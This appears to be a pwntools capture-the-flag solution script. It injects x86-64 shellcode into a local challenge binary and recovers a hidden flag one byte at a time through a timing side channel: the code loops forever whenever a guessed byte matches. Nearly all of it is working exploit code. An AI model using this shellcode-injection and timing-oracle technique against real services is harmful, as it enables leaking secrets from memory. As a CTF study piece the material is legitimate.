from pwn import *
import string

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)

gs = '''
b *$rebase(0x121b)
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path, level='error')


def try_letter(pos, byte):
    p = start()
    shell = asm("""
    push [rbp+0x18]    /* main() */
    pop r9                    
    add r9, 0x2f07     /* flag=main+0x2f07*/
    push [r9]          /* push flag contents to stack */
    loop:
      xor   r11, r11
      mov   r11b, byte [rsp-0x1+%i] 
      cmp   r11, %i                 
      je loop          /* if equal, loop forever */
     
    """ % (pos, byte))
    p.sendline(shell)
    time.sleep(1)

    try:
        p.recvline(timeout=0.05)
        log.warn('Matched %i at position %i' % (byte,pos))
        return True
    except Exception as e:
        return False

flag = ''
while (True):
    for pos in range(0, 100):
        for letter in string.printable:
            log.info("Trying char: [%s] at pos: [%i] " %(letter,pos))
            if (try_letter(pos, ord(letter))):
                flag += letter
                print('Flag Updated: %s' % flag)
                break
        if '}' in flag:
            break

print('Flag: %s' % flag)
